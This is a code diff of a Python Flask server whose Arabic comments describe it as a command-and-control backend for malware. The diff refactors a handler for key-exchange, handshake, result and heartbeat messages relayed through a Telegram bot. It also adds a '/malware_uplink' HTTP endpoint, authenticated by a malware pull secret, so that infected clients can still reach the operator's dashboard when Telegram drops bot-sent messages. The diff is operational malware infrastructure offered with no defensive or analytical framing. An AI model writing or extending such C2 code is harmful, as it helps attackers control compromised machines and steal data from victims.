@@ -586,16 +586,15 @@ def check_bot_status():
         return "unknown"
 
 # ======================== 0a. معالجة رسائل التيليجرام الداخلية ========================
-@app.route("/internal/tg_message", methods=["POST"])
-@require_auth
-def process_tg_message():
+def _handle_protocol_text(text: str):
     """
-    يُستدعى من bot.py عندما يستقبل رسالة من الجروب أو القناة تخص المالوير.
+    معالجة سطر بروتوكول واحد (من bot.py أو من malware_uplink HTTP).
     يعالج: KEY_REQUEST / HANDSHAKE / RESULT / HEARTBEAT
-    ويرجع { "reply": "..." } ليرسلها الرّلي — كما في c2-OLD يرسل الرد أساساً إلى القناة.
+    يرجع نص الرد (مثل PUBLIC_KEY / HANDSHAKE_OK) أو None.
     """
-    text  = (request.json or {}).get("text", "")
     reply = None
+    if not text:
+        return None
 
     # ── 1️⃣ طلب المفتاح العام ─────────────────────────────────────────
     if text.startswith("KEY_REQUEST:"):
@@ -701,6 +700,37 @@ def process_tg_message():
         except Exception:
             pass
 
+    return reply
+
+
+@app.route("/internal/tg_message", methods=["POST"])
+@require_auth
+def process_tg_message():
+    """
+    يُستدعى من bot.py عندما يستقبل رسالة من الجروب أو القناة تخص المالوير.
+    يعالج: KEY_REQUEST / HANDSHAKE / RESULT / HEARTBEAT
+    ويرجع { "reply": "..." } ليرسلها الرّلي — كما في c2-OLD يرسل الرد أساساً إلى القناة.
+    """
+    text = (request.json or {}).get("text", "")
+    if not isinstance(text, str):
+        text = ""
+    reply = _handle_protocol_text(text)
+    return jsonify({"reply": reply})
+
+
+@app.route("/malware_uplink", methods=["POST"])
+def malware_uplink():
+    """
+    مرآة HTTP لأسطر البروتوكول عندما يكون المالوير والرّلي على نفس توكن البوت:
+    Telegram لا يمرّر للـ getUpdates رسائل أرسلها البوت بنفسه، فيختفي HANDSHAKE عن bot.py
+    بينما يصل HANDSHAKE_OK للعميل عبر malware_pull فقط — الداشبورد يبقى بدون عميل.
+    يستخدم نفس سر malware_pull (بدون rate_limit خلف NAT).
+    """
+    if request.headers.get("X-Malware-Pull-Secret", "") != MALWARE_PULL_SECRET:
+        return jsonify({"error": "Unauthorized"}), 401
+    raw = (request.json or {}).get("text", "")
+    text = raw.strip() if isinstance(raw, str) else ""
+    reply = _handle_protocol_text(text)
     return jsonify({"reply": reply})
 
 
